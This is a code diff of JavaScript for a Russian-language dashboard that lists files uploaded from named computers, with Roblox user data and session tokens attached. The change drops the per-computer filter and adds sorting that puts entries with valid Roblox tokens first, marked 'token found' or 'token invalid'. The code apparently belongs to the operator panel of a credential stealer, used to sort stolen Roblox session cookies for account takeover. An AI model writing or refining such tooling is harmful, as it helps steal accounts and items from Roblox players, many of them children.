@@ -41,7 +41,6 @@ async function loadFiles() {
     }
 
     updateStats();
-    populatePCFilter();
     filterFiles();
   } catch (e) {
     if (e.message !== 'auth') toast("Ошибка загрузки файлов", "err");
@@ -64,32 +63,31 @@ function updateStats() {
   document.getElementById("sLast").textContent = last ? fmtDate(last.uploadedAt) : "—";
 }
 
-function populatePCFilter() {
-  const sel = document.getElementById("filterPC");
-  const cur = sel.value;
-  const pcs = Array.from(new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })));
-  let opts = "<option value=''>Все отправители</option>";
-  for (let i = 0; i < pcs.length; i++) {
-    const p = pcs[i];
-    opts += "<option value='" + escapeHtml(p) + "' " + (p === cur ? "selected" : "") + ">💻 " + escapeHtml(p) + "</option>";
-  }
-  sel.innerHTML = opts;
-}
-
 function filterFiles() {
-  const searchVal = document.getElementById("searchBar").value.toLowerCase();
-  const filterPC = document.getElementById("filterPC").value;
-
-  let list = allFiles;
-  if (searchVal) {
-    list = list.filter(function(f) { return (f.originalName || f.name).toLowerCase().includes(searchVal); });
+    const searchVal = document.getElementById("searchBar").value.toLowerCase();
+    const sortVal = document.getElementById("sortFiles").value;
+  
+    let list = [...allFiles];
+    if (searchVal) {
+      list = list.filter(function(f) { return (f.originalName || f.name).toLowerCase().includes(searchVal); });
+    }
+    
+    if (sortVal === "roblox") {
+      list.sort((a, b) => {
+        const aRoblox = a.roblox && a.roblox.user ? 1 : 0;
+        const bRoblox = b.roblox && b.roblox.user ? 1 : 0;
+        const aValid = aRoblox && a.roblox.security && (!a.robuxInfo || a.robuxInfo.valid !== false) ? 2 : aRoblox;
+        const bValid = bRoblox && b.roblox.security && (!b.robuxInfo || b.robuxInfo.valid !== false) ? 2 : bRoblox;
+        
+        if (aValid !== bValid) return bValid - aValid;
+        return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
+      });
+    } else {
+      list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
+    }
+  
+    renderFiles(list);
   }
-  if (filterPC) {
-    list = list.filter(function(f) { return (f.computer?.name || "Unknown") === filterPC; });
-  }
-
-  renderFiles(list);
-}
 
 function renderFiles(list) {
   const grid = document.getElementById("fileGrid");
@@ -117,13 +115,14 @@ function renderFiles(list) {
       previewHTML = "<div class='card-preview-icon'>" + icon(nm) + "</div>";
     }
 
-    const hasRoblox = f.roblox && f.roblox.security && f.roblox.security.length > 0;
-    const isValid = f.robuxInfo ? f.robuxInfo.valid !== false : true;
+    const hasRobloxUser = f.roblox && f.roblox.user;
+    const hasValidToken = f.roblox && f.roblox.security && f.roblox.security.length > 0 && (!f.robuxInfo || f.robuxInfo.valid !== false);
 
     let indicator = "";
-    if (hasRoblox) {
-      const color = isValid ? "var(--success)" : "var(--danger)";
-      indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 10px " + color + "; z-index: 10;' title='" + (isValid ? "Roblox токен найден" : "Токен недействителен") + "'></div>";
+    if (hasRobloxUser) {
+      const color = hasValidToken ? "var(--success)" : "var(--danger)";
+      const title = hasValidToken ? "Roblox токен найден" : "Токен недействителен или отсутствует";
+      indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 15px " + color + "; z-index: 10;' title='" + title + "'></div>";
     }
 
     html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\" style='position:relative'>" +
